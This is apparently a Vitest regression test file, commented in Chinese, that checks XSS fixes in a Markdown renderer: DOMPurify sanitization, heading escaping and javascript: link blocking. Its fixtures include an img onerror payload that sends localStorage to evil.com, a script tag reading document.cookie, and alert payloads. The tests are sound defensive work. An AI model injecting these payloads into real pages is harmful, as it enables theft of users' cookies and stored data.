/**
 * P0-2 XSS 修复回归测试（QA 补充）
 *
 * 验证 Markdown 渲染链路的关键安全修复真实生效：
 * 1. DOMPurify 消毒：<img onerror> 等内联事件处理器必须被清除；
 * 2. heading 渲染器转义：标题内嵌原始 HTML 不得原样透传；
 * 3. 预览注入路径：注入 innerHTML 之前必须经过 sanitize（与 markdown-preview.tsx 相同配置）。
 */

import { describe, it, expect, beforeAll } from 'vitest';
import { renderCompleteMarkdown } from '@/lib/markdown-renderer';

// 与 src/components/markdown-preview.tsx 完全一致的消毒配置
// 注：DOMPurify.Config 要求 ADD_ATTR 为可变 string[]，不能用 as const
const SANITIZE_OPTIONS = {
  ADD_ATTR: ['style', 'data-chart-config', 'data-heading'] as string[],
  ALLOW_DATA_ATTR: true,
  USE_PROFILES: { html: true },
};

let DOMPurify: typeof import('dompurify').default;

beforeAll(async () => {
  const mod = await import('dompurify');
  DOMPurify = mod.default;
});

describe('P0-2 XSS 防护（DOMPurify 消毒）', () => {
  it('预览渲染的 HTML 经消毒后应清除 <img onerror> 事件处理器', () => {
    const malicious = `<img src=x onerror="fetch('https://evil.com/?d='+localStorage)">`;
    const safe = DOMPurify.sanitize(malicious, SANITIZE_OPTIONS);
    expect(safe).not.toContain('onerror');
    expect(safe).not.toContain('evil.com');
  });

  it('消毒后不应保留 <script> 标签', () => {
    const malicious = `<script>document.cookie</script><p>hello</p>`;
    const safe = DOMPurify.sanitize(malicious, SANITIZE_OPTIONS);
    expect(safe).not.toContain('<script');
    expect(safe).toContain('hello');
  });

  it('消毒应保留正常链接与文本内容', () => {
    const html = `<a href="https://example.com">链接</a><p>正文</p>`;
    const safe = DOMPurify.sanitize(html, SANITIZE_OPTIONS);
    expect(safe).toContain('href="https://example.com"');
    expect(safe).toContain('正文');
  });

  it('完整 Markdown 渲染中的 heading 文本应被转义（不注入原始 HTML）', () => {
    // 带恶意 HTML 的标题；heading 渲染器应对 text 做 escapeHtml（P0-2）
    const markdown = `# 标题 <img src=x onerror="alert(1)">`;
    const html = renderCompleteMarkdown(markdown);
    // 原始 <img ...> 标签不得原样出现在渲染结果中（heading 渲染器已转义）
    expect(html).not.toContain('<img');
    // 文本内容应被转义为实体（浏览器按纯文本显示，不会执行）
    expect(html).toContain('&lt;img');
    // 不得出现可被解析为 HTML 属性的事件处理器（如 <h1 onerror=...>）
    expect(html).not.toMatch(/<h[1-6][^>]*\sonerror=/);
  });

  it('Markdown 链接中的 javascript: 协议不应可执行', () => {
    const markdown = `[点击](javascript:alert(1))`;
    const html = renderCompleteMarkdown(markdown);
    const safe = DOMPurify.sanitize(html, SANITIZE_OPTIONS);
    expect(safe).not.toContain('javascript:');
  });
});
